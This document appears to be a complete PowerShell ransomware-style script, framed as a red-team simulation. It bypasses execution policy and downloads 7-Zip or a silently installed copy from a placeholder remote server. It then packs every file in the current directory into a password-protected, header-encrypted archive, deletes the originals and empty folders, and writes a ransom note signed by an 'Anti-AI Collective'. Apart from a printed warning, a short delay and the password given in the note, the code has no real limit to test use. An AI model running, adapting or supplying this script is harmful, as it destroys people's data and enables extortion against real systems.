################################################################################
# File Encryption Simulation Script (PowerShell)
# For AUTHORIZED Red Team Operations Only
# WARNING: This will encrypt and delete files - use only in test environments
################################################################################

#Requires -Version 3.0

<#
.SYNOPSIS
    Simulates ransomware encryption behavior for red team testing.

.DESCRIPTION
    Downloads 7-Zip, creates encrypted archive, and deletes original files.
    FOR AUTHORIZED PENETRATION TESTING ONLY.

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing
    Warning: Will delete files permanently
#>

# Attempt to enable script execution (may require admin)
try {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Script execution policy bypassed for this process" -ForegroundColor Green
} catch {
    Write-Host "[!] Could not bypass execution policy - may require admin privileges" -ForegroundColor Yellow
}

# Configuration
$RemoteServer = "http://YOUR_SERVER_IP_HERE"
$SevenZipUrl = "$RemoteServer/7z.exe"
$SevenZipInstallerUrl = "$RemoteServer/7z-installer.exe"
$ArchiveName = "encrypted_files.7z"
$Password = "antai"
$InstallDir = "$env:ProgramFiles\7-Zip"
$TempDir = "$env:TEMP\7z_temp"
$CurrentDir = Get-Location

# Banner
Write-Host ""
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "File Encryption Simulation - Red Team Operation" -ForegroundColor Cyan
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[WARNING] This script will encrypt and delete files in current directory" -ForegroundColor Red
Write-Host "[WARNING] For authorized testing only - ensure proper authorization" -ForegroundColor Red
Write-Host ""
Write-Host "Current Directory: $CurrentDir" -ForegroundColor Yellow
Write-Host "Archive Name: $ArchiveName" -ForegroundColor Yellow
Write-Host ""
Write-Host "Starting in 5 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""

################################################################################
# Functions
################################################################################

function Write-Status {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )

    switch ($Type) {
        "Success" { Write-Host "[+] $Message" -ForegroundColor Green }
        "Error"   { Write-Host "[-] $Message" -ForegroundColor Red }
        "Warning" { Write-Host "[!] $Message" -ForegroundColor Yellow }
        "Info"    { Write-Host "[*] $Message" -ForegroundColor Cyan }
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )

    try {
        # Method 1: WebClient (faster)
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)
        return $true
    } catch {
        try {
            # Method 2: Invoke-WebRequest (fallback)
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
            return $true
        } catch {
            try {
                # Method 3: BitsTransfer (fallback)
                Import-Module BitsTransfer -ErrorAction SilentlyContinue
                Start-BitsTransfer -Source $Url -Destination $OutputPath
                return $true
            } catch {
                return $false
            }
        }
    }
}

function Find-SevenZip {
    # Check common installation paths
    $possiblePaths = @(
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
        "$env:LOCALAPPDATA\7-Zip\7z.exe",
        "$TempDir\7z.exe",
        "7z.exe"  # In PATH
    )

    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            return $path
        }
    }

    # Try to find in PATH
    $sevenZip = Get-Command "7z.exe" -ErrorAction SilentlyContinue
    if ($sevenZip) {
        return $sevenZip.Source
    }

    return $null
}

################################################################################
# Main Execution
################################################################################

try {
    # Step 1: Download 7-Zip executable
    Write-Status "Step 1/5: Downloading 7-Zip executable..." -Type Info

    if (-not (Test-Path $TempDir)) {
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
    }

    $sevenZipExe = Find-SevenZip

    if ($null -eq $sevenZipExe) {
        $downloadPath = "$TempDir\7z.exe"
        Write-Status "Downloading from $SevenZipUrl..." -Type Info

        if (Download-File -Url $SevenZipUrl -OutputPath $downloadPath) {
            Write-Status "Successfully downloaded 7-Zip executable" -Type Success
            $sevenZipExe = $downloadPath
        } else {
            Write-Status "Failed to download 7-Zip executable" -Type Error

            # Try to install from installer
            Write-Status "Step 2/5: Attempting to install 7-Zip..." -Type Info
            $installerPath = "$TempDir\7z-installer.exe"

            if (Download-File -Url $SevenZipInstallerUrl -OutputPath $installerPath) {
                Write-Status "Installer downloaded, installing silently..." -Type Info

                # Silent install
                Start-Process -FilePath $installerPath -ArgumentList "/S", "/D=$InstallDir" -Wait -NoNewWindow
                Start-Sleep -Seconds 5

                $sevenZipExe = Find-SevenZip

                if ($null -ne $sevenZipExe) {
                    Write-Status "7-Zip installed successfully" -Type Success
                } else {
                    throw "Failed to install 7-Zip"
                }
            } else {
                throw "Failed to download 7-Zip installer"
            }
        }
    } else {
        Write-Status "7-Zip already available at: $sevenZipExe" -Type Success
    }

    # Step 3: Create encrypted archive
    Write-Host ""
    Write-Status "Step 3/5: Creating encrypted 7z archive..." -Type Info
    Write-Status "Password: $Password" -Type Info
    Write-Status "This may take a while depending on file size..." -Type Info
    Write-Host ""

    $archivePath = Join-Path $CurrentDir $ArchiveName

    # Build 7-Zip arguments
    $arguments = @(
        "a",                    # Add to archive
        "-t7z",                 # Archive type
        "-m0=lzma2",           # Compression method
        "-mx=9",               # Maximum compression
        "-mfb=64",             # Fast bytes
        "-md=32m",             # Dictionary size
        "-ms=on",              # Solid archive
        "-mhe=on",             # Encrypt headers
        "-p$Password",         # Password
        "`"$archivePath`"",    # Archive path
        "`"$CurrentDir\*`"",   # Files to archive
        "-r",                  # Recursive
        "-x!$ArchiveName",     # Exclude the archive itself
        "-xr!*.7z"             # Exclude other 7z files
    )

    $process = Start-Process -FilePath $sevenZipExe -ArgumentList $arguments -Wait -PassThru -NoNewWindow

    if ($process.ExitCode -ne 0) {
        throw "Failed to create archive (Exit code: $($process.ExitCode))"
    }

    Write-Status "Archive created successfully: $ArchiveName" -Type Success

    # Step 4: Verify archive
    Write-Host ""
    Write-Status "Step 4/5: Verifying archive integrity..." -Type Info

    if (-not (Test-Path $archivePath)) {
        throw "Archive file not found!"
    }

    $verifyArgs = @("t", "-p$Password", "`"$archivePath`"")
    $verifyProcess = Start-Process -FilePath $sevenZipExe -ArgumentList $verifyArgs -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$TempDir\verify.log"

    if ($verifyProcess.ExitCode -ne 0) {
        throw "Archive verification failed!"
    }

    Write-Status "Archive verified successfully" -Type Success

    # Step 5: Delete original files
    Write-Host ""
    Write-Status "Step 5/5: Deleting original files..." -Type Info
    Write-Status "WARNING: This will permanently delete files!" -Type Warning
    Write-Status "Press Ctrl+C to abort in the next 5 seconds..." -Type Warning
    Start-Sleep -Seconds 5
    Write-Host ""

    # Get all files except the archive
    $filesToDelete = Get-ChildItem -Path $CurrentDir -Recurse -File |
        Where-Object { $_.FullName -ne $archivePath -and $_.Extension -ne '.7z' }

    $deletedCount = 0
    foreach ($file in $filesToDelete) {
        try {
            Write-Status "Deleting: $($file.FullName)" -Type Info
            Remove-Item -Path $file.FullName -Force -ErrorAction Stop
            $deletedCount++
        } catch {
            Write-Status "Failed to delete: $($file.FullName)" -Type Warning
        }
    }

    # Delete empty directories
    Get-ChildItem -Path $CurrentDir -Recurse -Directory |
        Sort-Object -Property FullName -Descending |
        Where-Object { (Get-ChildItem -Path $_.FullName -Force).Count -eq 0 } |
        Remove-Item -Force -ErrorAction SilentlyContinue

    Write-Status "Deleted $deletedCount files" -Type Success

    # Cleanup temp directory
    if (Test-Path $TempDir) {
        Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Final summary
    Write-Host ""
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "Operation Complete" -ForegroundColor Cyan
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host "[+] Encrypted archive: $archivePath" -ForegroundColor Green
    Write-Host "[+] Password: $Password" -ForegroundColor Green
    Write-Host "[+] Original files have been deleted" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] To extract files, use:" -ForegroundColor Cyan
    Write-Host "    7z x $ArchiveName -p$Password" -ForegroundColor Yellow
    Write-Host "============================================================================" -ForegroundColor Cyan
    Write-Host ""

    # Create ransom note
    $ransomNote = @"
============================================================================
YOUR FILES HAVE BEEN ENCRYPTED
============================================================================

All your files have been encrypted with military-grade encryption.

[This is a SIMULATED attack for authorized red team testing]

Archive: $ArchiveName
Password: $Password

To decrypt your files, use the password provided above.

============================================================================
Anti-AI Collective - Humans First, Machines Never
============================================================================
"@

    $ransomNote | Out-File -FilePath (Join-Path $CurrentDir "README_IMPORTANT.txt") -Encoding ASCII
    Write-Status "Ransom note created: README_IMPORTANT.txt" -Type Success

} catch {
    Write-Host ""
    Write-Status "ERROR: $($_.Exception.Message)" -Type Error
    Write-Status "Operation aborted" -Type Error
    exit 1
}

Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
